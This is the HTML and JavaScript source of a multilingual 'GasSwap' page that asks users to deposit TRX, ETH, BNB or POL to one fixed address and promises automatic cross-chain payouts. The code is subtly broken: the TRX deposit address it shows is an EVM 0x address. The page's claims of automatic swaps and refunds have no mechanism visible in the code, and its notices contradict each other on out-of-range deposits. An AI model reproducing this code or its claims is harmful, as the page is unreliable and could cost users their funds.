<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>GasSwap – TRX → BNB (BSC)</title>
  <meta name="description" content="Deposit TRX and receive BNB (BSC) automatically. Simple cross-chain swap request UI." />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <style>
    a { word-break: break-all; }
    .disabled-link { opacity: 0.4; cursor: not-allowed; pointer-events: none; }
    .flag-btn { font-size: 20px; cursor: pointer; opacity: 0.7; transition: 0.2s; }
    .flag-btn:hover { opacity: 1; transform: scale(1.1); }
    .flag-active { opacity: 1; border-bottom: 2px solid #34d399; }
  </style>
</head>
<body class="min-h-screen bg-slate-950 text-slate-100">

  <!-- HEADER -->
  <header class="border-b border-slate-800 bg-slate-900/60 backdrop-blur sticky top-0 z-20">
    <div class="max-w-6xl mx-auto px-4 py-3 flex flex-col md:flex-row md:items-center md:justify-between gap-3">
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-emerald-400 to-cyan-400"></div>
        <h1 class="text-lg font-semibold tracking-tight">GasSwap</h1>
        <span class="ml-2 text-xs text-slate-400">v1.0</span>
      </div>
      <!-- Language flags -->
      <div class="flex items-center gap-3 text-lg">
        <span class="flag-btn" data-lang="en">🇺🇸</span>
        <span class="flag-btn" data-lang="ko">🇰🇷</span>
        <span class="flag-btn" data-lang="ja">🇯🇵</span>
        <span class="flag-btn" data-lang="zh">🇨🇳</span>
        <span class="flag-btn" data-lang="es">🇪🇸</span>
      </div>
    </div>
  </header>

  <!-- MAIN -->
  <main class="max-w-5xl mx-auto px-4 py-8">

    <!-- Title -->
    <section class="rounded-2xl border border-slate-800 bg-slate-900 p-6 mb-6 text-center">
      <h2 id="title" class="text-2xl font-semibold mb-1">TRX → BNB (BSC)</h2>
      <h3 class="text-sm text-slate-500 tracking-wide mb-2">Cross-Chain Swap</h3>
      <p id="subtitle" class="text-slate-400 text-sm">Deposit TRX and receive BNB (BSC) automatically after confirmation.</p>
    </section>

<!-- Swap Menu -->
<section class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-3 mb-8">
  <a href="index.html" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → TRX</a>
  <a href="trx_bnb.html" class="text-center rounded-xl py-3 bg-emerald-500 text-slate-950 font-semibold">TRX → BNB</a>
  <button data-type="bnb-eth" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → ETH</button>
  <button data-type="eth-bnb" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">ETH → BNB</button>
  <button data-type="bnb-pol" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → POL</button>
  <button data-type="pol-bnb" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">POL → BNB</button>
</section>

<!-- Form + Session -->
<section class="grid md:grid-cols-2 gap-6">
  <!-- Left: Form -->
  <div class="rounded-2xl border border-slate-800 bg-slate-900 p-5">
    <h3 id="formTitle" class="text-lg font-semibold mb-4">Please fill this form before sending your tokens</h3>
    <form id="swapForm" class="space-y-4" novalidate>
      <div>
        <label id="labelSender" class="block text-sm mb-1">Sender (TRX)</label>
        <input id="sender" type="text" class="w-full rounded-xl bg-slate-950 border border-slate-800 focus:border-emerald-400 px-4 py-3 text-sm" placeholder="T..." required />
      </div>
      <div>
        <label id="labelReceiver" class="block text-sm mb-1">Receiver (BNB BSC)</label>
        <input id="receiver" type="text" class="w-full rounded-xl bg-slate-950 border border-slate-800 focus:border-emerald-400 px-4 py-3 text-sm" placeholder="0x…" required />
      </div>
      <div id="formError" class="hidden rounded-xl border border-red-500/40 bg-red-500/10 text-red-200 text-sm px-3 py-2"></div>
      <button id="startBtn" type="submit" class="w-full rounded-xl px-4 py-3 bg-emerald-500 text-slate-950 font-semibold hover:bg-emerald-400 focus:outline-none"> Start Swap </button>
    </form>

    <!-- Wallet Links -->
    <div id="userExplorers" class="hidden mt-5 text-sm text-slate-400 space-y-2 w-[95%] mx-auto">
      <div id="youCanCheck">Check Explorers:</div>
      <div class="mt-1"> 🔗 <a id="userTrxLink" target="_blank" class="underline hover:text-emerald-300">Tronscan(Sender)</a> </div>
      <div> 🔗 <a id="userBscLink" target="_blank" class="underline hover:text-emerald-300">BscScan(Receiver)</a> </div>
    </div>
  </div>

  <!-- Right: Session -->
  <div class="rounded-2xl border border-slate-800 bg-slate-900 p-5">
    <h3 id="sessionTitle" class="text-lg font-semibold mb-4">Deposit session</h3>
    <div id="inactiveHint" class="text-sm text-slate-400"> Fill the form and press <span class="font-semibold">Start Swap</span> to generate your session. </div>
    <div id="sessionPanel" class="hidden space-y-4">
      <div>
        <div class="text-xs text-slate-400" id="depositTo">Deposit to (fixed address)</div>
        <div class="mt-1 flex items-center gap-2">
          <code id="depositAddress" class="text-emerald-200 break-all"></code>
          <button id="copyDeposit" class="text-xs px-2 py-1 rounded-lg border border-slate-700 hover:bg-slate-800">Copy</button>
        </div>
      </div>
      <div class="grid grid-cols-2 gap-4">
        <div>
          <div id="qr" class="bg-white p-2 inline-block rounded-xl"></div>
          <div class="text-[10px] text-slate-500 mt-1" id="scanToDeposit">Scan to deposit</div>
        </div>
        <div>
          <div class="text-xs text-slate-400" id="deadlineLabel">Deposit deadline</div>
          <div id="countdown" class="text-3xl font-mono mt-1 text-right">59:59</div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- NOTICE -->
<section class="mt-8 text-center">
  <div id="noticeBox" class="bg-yellow-500/10 border border-yellow-500/40 text-yellow-200 rounded-xl p-4 text-sm leading-relaxed">
    ⚠️ For security: deposits under 1 USDT or above 20 USDT are not accepted. Please send only small amounts for gas purposes.
  </div>
</section>

<!-- INFO SECTION -->
<section class="mt-10 max-w-3xl mx-auto text-sm leading-relaxed">
  <div class="rounded-2xl border border-emerald-500/40 bg-emerald-500/10 p-6 text-emerald-100">
    <h3 class="text-lg font-semibold mb-3 text-center text-emerald-300">Why Use GasSwap?</h3>
    <ul class="list-disc list-inside space-y-1">
      <li>No need to connect your wallet</li>
      <li>Lowest cross-swap fee: +0.5 USDT equivalent token per transaction</li>
      <li>Simple process: just send and receive</li>
      <li>Instant verification on blockchain explorers</li>
    </ul>
    <h3 class="text-lg font-semibold mt-6 mb-3 text-center text-emerald-300">How to Use</h3>
    <ol class="list-decimal list-inside space-y-1">
      <li>Enter both the <b>Sender</b> and <b>Receiver</b> wallet addresses correctly</li>
      <li>Send TRX to the displayed deposit address</li>
      <li>Receive BNB automatically (usually within 5 minutes depending on network conditions)</li>
      <li>To prevent automated attacks and speculative swaps, any transaction value outside the range of 1 – 20 USDT will be automatically refunded (minus a fee for processing).</li>
    </ol>
  </div>
</section>

</main>

<!-- ✅ Modal (공통 팝업) -->
<div id="swapModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
  <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-[90%] p-6 text-center relative">
    <button id="closeModal" class="absolute top-2 right-3 text-slate-400 hover:text-emerald-400 text-xl">✕</button>
    <h2 id="modalTitle" class="text-xl font-bold mb-2"></h2>
    <p id="modalDesc" class="text-slate-400 text-sm mb-4"></p>
    <div class="text-xs text-slate-400 mb-2" id="modalDepositLabel"></div>
    <code id="modalAddress" class="block text-emerald-300 break-all mb-3">0xDA1E8b362DDe013EA87Cf8984D64490c1900d231</code>
    <button id="copyAddr" class="px-3 py-2 rounded-lg border border-slate-700 hover:bg-slate-800 text-sm mb-4">Copy Address</button>
    <div id="modalQR" class="flex justify-center mb-4"></div>
    <div id="explorerLinks" class="space-y-1 text-sm text-slate-400"></div>
  </div>
</div>

<footer class="mt-10 py-10 text-center text-xs text-slate-500">
  © <span id="year"></span> GasSwap
</footer>


<script>
/* === 최소 변경 원칙: TRX↔BSC 방향 전환 + JSON 파일 경로만 === */

const CONFIG = {
  FORM_ENDPOINT: "https://gasswap-proxy.workers.dev",
  // ⚠️ 사용자가 제공한 그대로 둡니다 (주소 문자열도 변경하지 않음)
  SERVER_BSC: "0xDA1E8b362DDe013EA87Cf8984D64490c1900d231",
  SESSION_SECONDS: 3600
};

/* 다국어 (TRX → BNB 문구로 구성) */
const I18N = {
  en: {
    title:"TRX → BNB (BSC)",
    subtitle:"Deposit TRX and receive BNB (BSC) automatically after confirmation.",
    formTitle:"Please fill this form before sending your tokens",
    labelSender:"Sender (TRX)",
    labelReceiver:"Receiver (BNB BSC)",
    start:"Start Swap",
    sessionTitle:"Deposit session",
    depositTo:"Deposit to (fixed address)",
    scanToDeposit:"Scan to deposit",
    deadlineLabel:"Deposit deadline",
    youCanCheck:"Check Explorers:",
    viewTrx:"Tronscan(Sender)",
    viewBsc:"BscScan(Receiver)",
    why:"Why Use GasSwap?",
    whyList:[
      "No need to connect your wallet",
      "Lowest cross-swap fee: +0.5 USDT equivalent token per transaction",
      "Simple process: just send and receive",
      "Instant verification on blockchain explorers"
    ],
    how:"How to Use",
    howList:[
      "Enter both the Sender and Receiver wallet addresses correctly",
      "Send TRX to the displayed deposit address",
      "Receive BNB automatically (usually within 5 minutes depending on network conditions)",
      "To prevent automated attacks and speculative swaps, any transaction value outside the range of 1 – 20 USDT will be automatically refunded (minus a fee for processing)."
    ],
    notice:"⚠️ For security: deposits under 1 USDT or above 20 USDT are not accepted. Please send only small amounts for gas purposes.",
    err_sender:"Invalid TRX address",
    err_receiver:"Invalid BSC address"
  },
  ko: {
    title:"TRX → BNB (BSC)",
    subtitle:"TRX를 입금하면 확인 후 BNB(BSC)가 자동 전송됩니다.",
    formTitle:"토큰을 보내기 전에 먼저 작성하세요",
    labelSender:"보내는 지갑 (TRX)",
    labelReceiver:"받는 지갑 (BNB BSC)",
    start:"스왑 시작하기",
    sessionTitle:"입금 세션",
    depositTo:"입금 주소 (고정)",
    scanToDeposit:"입금용 QR 코드",
    deadlineLabel:"입금 제한시간",
    youCanCheck: "탐색기에서 확인하기:",
    viewTrx: "Tronscan (보내는 지갑)",
    viewBsc: "BscScan (받는 지갑)",
    why:"왜 GasSwap을 사용하나요?",
    whyList:[
      "지갑 연결이 필요 없습니다",
      "최저 스왑 수수료: 거래당 0.5 USDT 상당 토큰",
      "간단한 절차: 보내고 받기만 하면 됩니다",
      "블록체인 탐색기에서 즉시 확인 가능"
    ],
    how:"사용 방법",
    howList:[
      "보내는 지갑과 받는 지갑 주소를 정확히 입력하세요",
      "표시된 입금 주소로 TRX를 전송하세요",
      "네트워크 상황에 따라 약 5분 내 BNB가 자동 입금됩니다",
      "자동 공격 및 투기성 스왑을 방지하기 위해 1~20 USDT 범위를 벗어난 거래는 처리 수수료를 제외하고 자동 환불됩니다."
    ],
    notice:"⚠️ 자동 공격 방지 및 가스 보호를 위해 1 USDT 미만 또는 20 USDT 초과 입금은 허용되지 않습니다. 가스 목적의 소액만 전송해주세요.",
    err_sender:"TRX 주소가 올바르지 않습니다.",
    err_receiver:"BNB(BSC) 주소가 올바르지 않습니다."
  },
  ja: {
    title:"TRX → BNB (BSC)",
    subtitle:"TRXを入金すると、確認後にBNB(BSC)が自動送付されます。",
    formTitle:"トークンを送る前にこのフォームを記入してください",
    labelSender:"送信元 (TRX)",
    labelReceiver:"受信先 (BNB BSC)",
    start:"スワップ開始",
    sessionTitle:"入金セッション",
    depositTo:"入金先アドレス (固定)",
    scanToDeposit:"入金用QRコード",
    deadlineLabel:"入金期限",
    youCanCheck: "エクスプローラーを確認:",
    viewTrx: "Tronscan（送信元）",
    viewBsc: "BscScan（受信先）",
    why:"なぜGasSwapを使うのか？",
    whyList:[
      "ウォレット接続は不要",
      "最安のクロススワップ手数料：取引ごとに0.5 USDT相当",
      "シンプルな手順：送るだけでOK",
      "ブロックチェーンエクスプローラーで即時確認可能"
    ],
    how:"使い方",
    howList:[
      "送信元と受信先のウォレットアドレスを正確に入力してください",
      "表示された入金先アドレスにTRXを送信します",
      "ネットワーク状況により約5分以内にBNBを自動受信します",
      "自動攻撃や投機的なスワップを防ぐため、1～20 USDTの範囲外の取引は手数料を差し引いて自動返金されます。"
    ],
    notice:"⚠️ セキュリティのため、1 USDT未満または20 USDT超の入金は受け付けません。ガス目的の少額のみを送信してください。",
    err_sender:"TRXアドレスが無効です。",
    err_receiver:"BSCアドレスが無効です。"
  },
  zh: {
    title:"TRX → BNB (BSC)",
    subtitle:"入金 TRX，确认后自动收到 BNB（BSC）。",
    formTitle:"请在发送代币前填写此表单",
    labelSender:"发送地址 (TRX)",
    labelReceiver:"接收地址 (BNB BSC)",
    start:"开始兑换",
    sessionTitle:"入金会话",
    depositTo:"入金地址（固定）",
    scanToDeposit:"扫描二维码入金",
    deadlineLabel:"入金截止时间",
    youCanCheck: "查看区块浏览器：",
    viewTrx: "Tronscan（发送地址）",
    viewBsc: "BscScan（接收地址）",
    why:"为什么使用GasSwap？",
    whyList:[
      "无需连接钱包",
      "最低跨链费用：每笔交易+0.5 USDT等值代币",
      "操作简单：只需发送和接收",
      "可在区块链浏览器上即时验证"
    ],
    how:"使用方法",
    howList:[
      "正确输入发送和接收钱包地址",
      "向显示的存款地址发送TRX",
      "通常5分钟内自动收到BNB（视网络情况而定）",
      "为防止自动攻击和投机性交换，超出1–20 USDT范围的交易将自动退款（扣除处理费用）。"
    ],
    notice:"⚠️ 为了安全，请勿转入1 USDT以下或20 USDT以上金额。仅用于Gas的小额入金。",
    err_sender:"无效的 TRX 地址",
    err_receiver:"无效的 BSC 地址"
  },
  es: {
    title:"TRX → BNB (BSC)",
    subtitle:"Deposita TRX y recibe BNB (BSC) automáticamente tras la confirmación.",
    formTitle:"Por favor completa este formulario antes de enviar tus tokens",
    labelSender:"Remitente (TRX)",
    labelReceiver:"Receptor (BNB BSC)",
    start:"Iniciar intercambio",
    sessionTitle:"Sesión de depósito",
    depositTo:"Depositar en (dirección fija)",
    scanToDeposit:"Escanear para depositar",
    deadlineLabel:"Plazo de depósito",
    youCanCheck: "Ver exploradores:",
    viewTrx: "Tronscan (Remitente)",
    viewBsc: "BscScan (Receptor)",
    why:"¿Por qué usar GasSwap?",
    whyList:[
      "No necesitas conectar tu billetera",
      "Tarifa más baja: +0.5 USDT equivalente por transacción",
      "Proceso simple: solo envía y recibe",
      "Verificación instantánea en exploradores blockchain"
    ],
    how:"Cómo usarlo",
    howList:[
      "Introduce correctamente las direcciones de remitente y receptor",
      "Envía TRX a la dirección mostrada",
      "Recibe BNB automáticamente (normalmente dentro de 5 minutos, según la red)",
      "Para evitar ataques automáticos y swaps especulativos, cualquier transacción fuera del rango de 1–20 USDT será reembolsada automáticamente (menos una tarifa de procesamiento)."
    ],
    notice:"⚠️ Por seguridad, no se aceptan depósitos menores a 1 USDT o mayores a 20 USDT. Envía solo pequeñas cantidades con fines de gas.",
    err_sender:"Dirección TRX inválida",
    err_receiver:"Dirección BSC inválida"
  }
};

const $ = s => document.querySelector(s);
const isEVM = a => /^0x[0-9a-fA-F]{40}$/.test(a || "");
const isTRX = a => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a || "");
let currentLang = "en";

async function detectLang() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const j = await r.json();
    const c = (j.country_code || "").toUpperCase();
    if (c === "KR") return "ko";
    if (c === "JP") return "ja";
    if (["CN","TW","HK","MO"].includes(c)) return "zh";
    if (["ES","MX","AR","CO","CL","PE"].includes(c)) return "es";
    return "en";
  } catch {
    return "en";
  }
}

function applyLang() {
  const t = I18N[currentLang];
  $("#title").textContent = t.title;
  $("#subtitle").textContent = t.subtitle;
  $("#formTitle").textContent = t.formTitle;
  $("#labelSender").textContent = t.labelSender;
  $("#labelReceiver").textContent = t.labelReceiver;
  $("#startBtn").textContent = t.start;
  $("#sessionTitle").textContent = t.sessionTitle;
  $("#depositTo").textContent = t.depositTo;
  $("#scanToDeposit").textContent = t.scanToDeposit;
  $("#deadlineLabel").textContent = t.deadlineLabel;
  $("#youCanCheck").textContent = t.youCanCheck;
  $("#noticeBox").textContent = t.notice;
  $("#userTrxLink").textContent = t.viewTrx;
  $("#userBscLink").textContent = t.viewBsc;

  // 섹션 헤더
  const headers = document.querySelectorAll("h3.text-emerald-300");
  if (headers[0]) headers[0].textContent = t.why;
  if (headers[1]) headers[1].textContent = t.how;

  // 리스트 번역
  const whyItems = document.querySelectorAll(".list-disc li");
  const howItems = document.querySelectorAll(".list-decimal li");
  if (t.whyList) whyItems.forEach((li, i) => t.whyList[i] && (li.textContent = t.whyList[i]));
  if (t.howList) howItems.forEach((li, i) => t.howList[i] && (li.textContent = t.howList[i]));
}

function highlightFlag() {
  document.querySelectorAll(".flag-btn").forEach(f =>
    f.classList.toggle("flag-active", f.dataset.lang === currentLang)
  );
}

function makeQR(text){
  $("#qr").innerHTML = "";
  new QRCode($("#qr"), { text, width:160, height:160, correctLevel: QRCode.CorrectLevel.M });
}

function showSession(){
  $("#inactiveHint").classList.add("hidden");
  $("#sessionPanel").classList.remove("hidden");
  // 주소 표시는 기존 변수 이름 유지(사용자 지시에 따라 다른 부분 변경하지 않음)
  $("#depositAddress").textContent = CONFIG.SERVER_BSC;
  makeQR(CONFIG.SERVER_BSC);
  startCountdown(CONFIG.SESSION_SECONDS);

  const explorers = $("#userExplorers");
  if (explorers) explorers.classList.remove("hidden");
}

function startCountdown(s){
  const el = $("#countdown");
  const end = Date.now() + s * 1000;
  const tick = ()=>{
    const r = Math.max(0, Math.floor((end - Date.now())/1000));
    const m = String(Math.floor(r/60)).padStart(2,"0");
    const sec = String(r%60).padStart(2,"0");
    el.textContent = `${m}:${sec}`;
    if (r>0) setTimeout(tick, 1000);
  };
  tick();
}

/* === JSON 경로만 변경 (data/forms_trx_bnb.json) === */
async function updateForms(sender, receiver) {
  const repo = "GasSwap/gasswap-data";
  const path = "data/forms_trx_bnb.json"; // ← 여기만 바꿈
  const url  = `https://api.github.com/repos/${repo}/contents/${path}`;

  const res = await fetch(CONFIG.FORM_ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sender, receiver, repo, path, url })
  });

  if (res.ok) alert("✅ Swap request saved to GitHub!");
  else alert("❌ Error: " + await res.text());
}

document.addEventListener("DOMContentLoaded", async ()=>{
  $("#year").textContent = new Date().getFullYear();
  currentLang = await detectLang();
  applyLang();
  highlightFlag();

  document.querySelectorAll(".flag-btn").forEach(f =>
    f.addEventListener("click", () => {
      currentLang = f.dataset.lang;
      applyLang();
      highlightFlag();
    })
  );

  $("#copyDeposit").addEventListener("click", async ()=>{
    const addr = $("#depositAddress").textContent.trim();
    const btn = $("#copyDeposit");
    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(addr);
      } else {
        const ta = document.createElement("textarea");
        ta.value = addr; document.body.appendChild(ta);
        ta.select(); document.execCommand("copy");
        document.body.removeChild(ta);
      }
      const prev = btn.textContent;
      btn.textContent = "Copied!";
      btn.classList.add("border-emerald-500");
      setTimeout(()=>{ btn.textContent = prev; btn.classList.remove("border-emerald-500"); },1500);
    } catch {
      alert("Copy failed. Please copy manually.");
    }
  });

  // TRX(sender) / BSC(receiver) 검증으로 전환
  $("#swapForm").addEventListener("submit", async e=>{
    e.preventDefault();
    const sender = $("#sender").value.trim();
    const receiver = $("#receiver").value.trim();
    const err = $("#formError");
    const t = I18N[currentLang];

    if (!isTRX(sender))   { err.textContent = t.err_sender;   err.classList.remove("hidden"); return; }
    if (!isEVM(receiver)) { err.textContent = t.err_receiver; err.classList.remove("hidden"); return; }
    err.classList.add("hidden");

    $("#startBtn").disabled = true;
    $("#startBtn").classList.add("opacity-50","cursor-not-allowed");

    showSession();
    // 탐색기 링크도 TRX(sender) / BSC(receiver)로 전환
    $("#userTrxLink").href = `https://tronscan.org/#/address/${sender}`;
    $("#userBscLink").href = `https://bscscan.com/address/${receiver}`;

    await updateForms(sender, receiver);
  });
});

/* ===== 모달 (다른 스왑들 안내) : 기능 유지 ===== */
const swapPairs = {
  "bnb-eth": {
    title: "BNB → ETH",
    desc: {
      en: "Send BNB (BSC) to the address below. The same address will automatically return ETH after confirmation.",
      ko: "아래 주소로 BNB(BSC)를 보내세요. 확인 후 동일한 주소로 ETH가 자동 반환됩니다.",
      ja: "下記のアドレスにBNB(BSC)を送信してください。確認後、同じアドレスにETHが自動返送されます。",
      zh: "请将BNB(BSC)发送至以下地址。确认后，同一地址将自动返回ETH。",
      es: "Envía BNB (BSC) a la siguiente dirección. La misma dirección devolverá automáticamente ETH después de la confirmación."
    },
    label: {
      en: "Deposit Address (BSC)",
      ko: "입금 주소 (BSC)",
      ja: "入金アドレス (BSC)",
      zh: "入金地址（BSC）",
      es: "Dirección de depósito (BSC)"
    },
    explorers: {
      en: ["BscScan (Sender)", "Etherscan (Receiver)"],
      ko: ["BscScan (보내는 지갑)", "Etherscan (받는 지갑)"],
      ja: ["BscScan（送信元）", "Etherscan（受信先）"],
      zh: ["BscScan（发送地址）", "Etherscan（接收地址）"],
      es: ["BscScan (Remitente)", "Etherscan (Receptor)"]
    },
    urls: ["https://bscscan.com/address/","https://etherscan.io/address/"]
  },
  "eth-bnb": {
    title: "ETH → BNB",
    desc: {
      en: "Send ETH to the address below. The same address will automatically return BNB after confirmation.",
      ko: "아래 주소로 ETH를 보내세요. 확인 후 동일한 주소로 BNB가 자동 반환됩니다.",
      ja: "下記のアドレスにETHを送信してください。確認後、同じアドレスにBNBが自動返送されます。",
      zh: "请将ETH发送至以下地址。确认后，同一地址将自动返回BNB。",
      es: "Envía ETH a la siguiente dirección. La misma dirección devolverá automáticamente BNB después de la confirmación."
    },
    label: {
      en: "Deposit Address (ETH)",
      ko: "입금 주소 (ETH)",
      ja: "入金アドレス (ETH)",
      zh: "入金地址（ETH）",
      es: "Dirección de depósito (ETH)"
    },
    explorers: {
      en: ["Etherscan (Sender)", "BscScan (Receiver)"],
      ko: ["Etherscan (보내는 지갑)", "BscScan (받는 지갑)"],
      ja: ["Etherscan（送信元）", "BscScan（受信先）"],
      zh: ["Etherscan（发送地址）", "BscScan（接收地址）"],
      es: ["Etherscan (Remitente)", "BscScan (Receptor)"]
    },
    urls: ["https://etherscan.io/address/","https://bscscan.com/address/"]
  },
  "bnb-pol": {
    title: "BNB → POL",
    desc: {
      en: "Send BNB (BSC) to the address below. The same address will automatically return POL after confirmation.",
      ko: "아래 주소로 BNB(BSC)를 보내세요. 확인 후 동일한 주소로 POL이 자동 반환됩니다.",
      ja: "下記のアドレスにBNB(BSC)を送信してください。確認後、同じアドレスにPOLが自動返送されます。",
      zh: "请将BNB(BSC)发送至以下地址。确认后，同一地址将自动返回POL。",
      es: "Envía BNB (BSC) a la siguiente dirección. La misma dirección devolverá automáticamente POL después de la confirmación."
    },
    label: {
      en: "Deposit Address (BSC)",
      ko: "입금 주소 (BSC)",
      ja: "入金アドレス (BSC)",
      zh: "入金地址（BSC）",
      es: "Dirección de depósito (BSC)"
    },
    explorers: {
      en: ["BscScan (Sender)", "Polygonscan (Receiver)"],
      ko: ["BscScan (보내는 지갑)", "Polygonscan (받는 지갑)"],
      ja: ["BscScan（送信元）", "Polygonscan（受信先）"],
      zh: ["BscScan（发送地址）", "Polygonscan（接收地址）"],
      es: ["BscScan (Remitente)", "Polygonscan (Receptor)"]
    },
    urls: ["https://bscscan.com/address/","https://polygonscan.com/address/"]
  },
  "pol-bnb": {
    title: "POL → BNB",
    desc: {
      en: "Send POL (Polygon) to the address below. The same address will automatically return BNB after confirmation.",
      ko: "아래 주소로 POL(Polygon)을 보내세요. 확인 후 동일한 주소로 BNB가 자동 반환됩니다.",
      ja: "下記のアドレスにPOL(Polygon)を送信してください。確認後、同じアドレスにBNBが自動返送されます。",
      zh: "请将POL(Polygon)发送至以下地址。确认后，同一地址将自动返回BNB。",
      es: "Envía POL (Polygon) a la siguiente dirección. La misma dirección devolverá automáticamente BNB después de la confirmación."
    },
    label: {
      en: "Deposit Address (Polygon)",
      ko: "입금 주소 (Polygon)",
      ja: "入金アドレス (Polygon)",
      zh: "入金地址（Polygon）",
      es: "Dirección de depósito (Polygon)"
    },
    explorers: {
      en: ["Polygonscan (Sender)", "BscScan (Receiver)"],
      ko: ["Polygonscan (보내는 지갑)", "BscScan (받는 지갑)"],
      ja: ["Polygonscan（送信元）", "BscScan（受信先）"],
      zh: ["Polygonscan（发送地址）", "BscScan（接收地址）"],
      es: ["Polygonscan (Remitente)", "BscScan (Receptor)"]
    },
    urls: ["https://polygonscan.com/address/","https://bscscan.com/address/"]
  }
};

const depositAddress = CONFIG.SERVER_BSC; // 기존 변수 그대로 사용
const modal = $("#swapModal"), qrDiv = $("#modalQR");

document.querySelectorAll("button[data-type]").forEach(btn => {
  btn.addEventListener("click", () => {
    const type = btn.dataset.type;
    const data = swapPairs[type];
    const lang = currentLang || "en";

    $("#modalTitle").textContent = data.title;
    $("#modalDesc").textContent = data.desc[lang] || data.desc.en;
    $("#modalDepositLabel").textContent = data.label[lang] || data.label.en;
    $("#modalAddress").textContent = depositAddress;

    $("#explorerLinks").innerHTML = `
      🔗 <a href="${data.urls[0] + depositAddress}" target="_blank" class="underline hover:text-emerald-300">${data.explorers[lang][0]}</a><br>
      🔗 <a href="${data.urls[1] + depositAddress}" target="_blank" class="underline hover:text-emerald-300">${data.explorers[lang][1]}</a>
    `;

    qrDiv.innerHTML = "";
    new QRCode(qrDiv, { text: depositAddress, width: 140, height: 140, correctLevel: QRCode.CorrectLevel.M });
    modal.classList.remove("hidden");
  });
});

$("#closeModal").addEventListener("click", () => modal.classList.add("hidden"));
modal.addEventListener("click", e => { if (e.target === modal) modal.classList.add("hidden"); });
$("#copyAddr").addEventListener("click", async () => {
  await navigator.clipboard.writeText(depositAddress);
  const b = $("#copyAddr");
  const old = b.textContent;
  b.textContent = "Copied!";
  b.classList.add("border-emerald-500");
  setTimeout(() => { b.textContent = old; b.classList.remove("border-emerald-500"); }, 1500);
});
</script>

</body>
</html>

